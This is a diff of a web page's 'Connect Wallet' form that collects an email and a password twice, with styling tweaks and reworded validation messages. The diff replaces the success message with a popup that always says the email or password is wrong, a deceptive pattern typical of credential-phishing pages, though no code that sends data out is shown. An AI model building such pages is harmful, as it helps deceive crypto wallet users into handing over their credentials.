@@ -41,7 +41,7 @@
         margin-bottom: 15px;
       }
 
-      .email-card h2 {
+      h2 {
         margin: 10px 0 20px;
         font-size: 24px;
         font-weight: bold;
@@ -80,20 +80,18 @@
         box-shadow: 0 0 12px #11ffee;
       }
 
-      /* FIXED CHECKBOX ROW */
       .check-row {
         display: flex;
         align-items: center;
-        justify-content: flex-start; /* Right side move */
-        gap: 10px;
-        width: 100%;
+        justify-content: flex-start;
+        gap: 8px;
         margin-top: 5px;
-        padding-left: 3px; /* Slight right spacing */
+        padding-left: 5px;
       }
 
       .check-row input[type="checkbox"] {
-        width: 12px; /* smaller size */
-        height: 12px; /* smaller size */
+        width: 13px;
+        height: 13px;
         cursor: pointer;
       }
 
@@ -103,8 +101,8 @@
         white-space: nowrap;
       }
 
-      /* POPUP */
-      #popup {
+      #popup,
+      #popupWrong {
         display: none;
         position: fixed;
         top: 50%;
@@ -120,7 +118,8 @@
         z-index: 9999;
       }
 
-      #popup button {
+      #popup button,
+      #popupWrong button {
         margin-top: 12px;
         padding: 10px 22px;
         border: none;
@@ -150,10 +149,14 @@
       <button onclick="validateForm()">Connect Wallet</button>
     </div>
 
-    <!-- POPUP -->
     <div id="popup">
-      <p id="popupMsg">Please fill out this field.</p>
+      <p id="popupMsg">Please Fill Out This Field.</p>
       <button onclick="closePopup()">OK</button>
+    </div>
+
+    <div id="popupWrong">
+      <p>Please Enter Correct Email Or Password</p>
+      <button onclick="closeWrong()">OK</button>
     </div>
 
     <script>
@@ -171,13 +174,13 @@
         const p2 = document.getElementById("pass2").value.trim();
         const check = document.getElementById("confirmCheck").checked;
 
-        if (email === "") return showPopup("Please enter your email.");
-        if (p1 === "") return showPopup("Please enter your password.");
-        if (p2 === "") return showPopup("Please confirm your password.");
-        if (p1 !== p2) return showPopup("Passwords do not match.");
-        if (!check) return showPopup("Please tick the confirmation checkbox.");
+        if (email === "") return showPopup("Please Enter your Email.");
+        if (p1 === "") return showPopup("Please Enter your Password.");
+        if (p2 === "") return showPopup("Please Confirm your Password.");
+        if (p1 !== p2) return showPopup("Passwords Do Not Match.");
+        if (!check) return showPopup("Please Tick The Confirmation Checkbox.");
 
-        showPopup("Wallet connected successfully!");
+        document.getElementById("popupWrong").style.display = "block";
       }
 
       function showPopup(msg) {
@@ -187,6 +190,10 @@
 
       function closePopup() {
         document.getElementById("popup").style.display = "none";
+      }
+
+      function closeWrong() {
+        document.getElementById("popupWrong").style.display = "none";
       }
     </script>
   </body>
